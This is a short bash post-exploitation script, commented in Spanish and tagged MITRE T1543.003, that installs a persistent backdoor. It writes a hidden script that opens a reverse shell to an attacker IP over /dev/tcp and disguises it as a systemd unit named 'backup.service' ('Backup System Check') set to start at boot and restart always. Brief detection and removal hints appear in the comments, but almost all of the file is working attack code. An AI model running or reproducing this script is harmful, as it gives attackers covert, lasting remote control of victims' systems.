#!/bin/bash

# Crea servicio systemd camuflado como "backup.service" que ejecuta reverse shell.
# Funciona: Inicia al boot un script oculto.
# Persistencia: Auto-inicio via systemd.
# Detección: systemctl list-units, /var/log/syslog. Eliminar: systemctl disable/stop, rm archivos.
# MITRE: T1543.003.

ATTACKER_IP=${1:-192.168.1.50}
PORT=${2:-4444}
SERVICE_NAME="backup.service"
BACKDOOR_SCRIPT="/usr/local/bin/backup_check.sh"  # Camuflado.

if systemctl is-active --quiet "$SERVICE_NAME"; then
    echo "[+] Servicio ya existe. Saltando." | tee -a /var/log/postops.log
    exit 0
fi

echo "[+] Creando servicio systemd persistente camuflado" | tee -a /var/log/postops.log

# Crea script backdoor
echo "#!/bin/bash" | sudo tee "$BACKDOOR_SCRIPT" >/dev/null
echo "bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1" | sudo tee -a "$BACKDOOR_SCRIPT" >/dev/null
sudo chmod +x "$BACKDOOR_SCRIPT"

# Crea unidad systemd
sudo bash -c "cat > /etc/systemd/system/$SERVICE_NAME" <<EOF
[Unit]
Description=Backup System Check
After=network.target

[Service]
ExecStart=$BACKDOOR_SCRIPT
Restart=always

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload || { echo "Error en daemon-reload"; exit 1; }
sudo systemctl enable "$SERVICE_NAME" || { echo "Error en enable"; exit 1; }
sudo systemctl start "$SERVICE_NAME" || { echo "Error en start"; exit 1; }

echo "[+] Servicio añadido" | tee -a /var/log/postops.log
